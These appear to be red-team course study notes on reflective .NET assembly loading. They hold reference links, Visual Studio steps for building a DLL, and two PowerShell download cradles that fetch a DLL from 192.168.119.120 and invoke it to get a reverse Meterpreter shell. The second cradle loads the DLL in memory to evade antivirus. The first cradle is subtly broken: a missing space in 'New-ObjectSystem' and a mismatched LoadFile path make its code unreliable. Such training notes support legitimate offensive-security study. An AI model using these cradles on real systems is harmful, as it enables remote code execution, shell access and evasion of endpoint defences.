#### Reflective Load notes

- https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#c-dll-with-powershell-cradle-in-memory
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-assembly/dotnet-reflective-assembly

- https://osnotes.jackielam.net/osep/attack/client-side-code-execution/in-memory-reflective-load-.dll-+-.ps1 

- https://www.petergirnus.com/blog/what-is-reflective-code-loading-t1620
- https://attack.mitre.org/techniques/T1620/

- https://medium.com/@andrew.petrus/exploring-powershell-reflective-loading-in-lumma-stealer-8de0e6c04131

- https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/



#### open the previous ConsoleApp1 C# project in Visual Studio. We’ll create a new project in the solution to house our code by right-clicking Solution ‘ConsoleApp1’ in the Solution Explorer, navigating to Add, and clicking New Project, from the Add a new project menu, we’ll select Class Library (.Net Framework), which will create a managed DLL when we compile

#### Load and Execute with PS In memory

(New-ObjectSystem.Net.WebClient).DownloadFile('http://192.168.119.120/ClassLibrary1.dll','C:\Users\Offsec\ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::LoadFile("\ClassLibrary1.dll")
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)

# Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly to disk before loading it. We can subvert this by instead using the Load method, which accepts a Byte array in memory instead of a disk file. In this case, we’ll modify our PowerShell code to use the DownloadData method of the Net.WebClient class to download the DLL as a byte array.

or

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
